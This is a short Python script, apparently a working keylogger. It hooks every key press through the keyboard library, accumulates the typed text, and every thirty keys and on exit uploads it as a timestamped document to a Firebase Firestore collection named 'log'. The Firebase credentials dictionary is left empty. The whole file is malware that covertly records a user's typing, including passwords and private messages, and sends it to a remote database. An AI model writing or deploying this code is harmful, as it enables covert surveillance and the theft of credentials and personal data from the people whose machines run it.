import keyboard
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from datetime import datetime 


credentialdata={
 
}

cred = credentials.Certificate(credentialdata)
app = firebase_admin.initialize_app(cred)
db=firestore.client()
class Logger:
    
   
    count=0
    flag=False
    def __init__(self) :
        self.s=""
    def add_key(self, key_name):
        if(key_name=="space"):
            Logger.concat(self," ")
        elif(key_name=="enter"):
             Logger.concat(self,"\n")
        elif(key_name=="right shift" or key_name =="shift"):
            pass
        elif(len(key_name)>1 and (self.flag ==False)):
            self.count+=1
            self.flag=True
            
            Logger.concat(self,f"\n{key_name}\n")
           
        elif (len(key_name)>1):
            self.count+=1
            Logger.concat(self,f"\n{key_name}\n")
           
        else:
            self.count+=1
            self.flag=False
            Logger.concat(self,key_name)
            
        if(self.count==30):
            self.count=0
           
            Logger.upload(self)
            #Logger.file.truncate(0)
    
        
        #uploadlog()
        #Logger.file.truncate(0)
        #Logger.file.close()
    def concat(self,str):
        self.s+=str
        
    def upload(self):
        now = datetime.now()
        filename1 = now.strftime("%Y%m%d_%H%M%S_log.txt")
        data={"str":self.s}
        db.collection("log").document(filename1).set(data)

def on_key_release(event):
   logger.add_key(event.name)
 
logger=Logger()
keyboard.on_press(callback=on_key_release)
try:
    keyboard.wait()
finally:
    
    logger.upload()
    
  



  

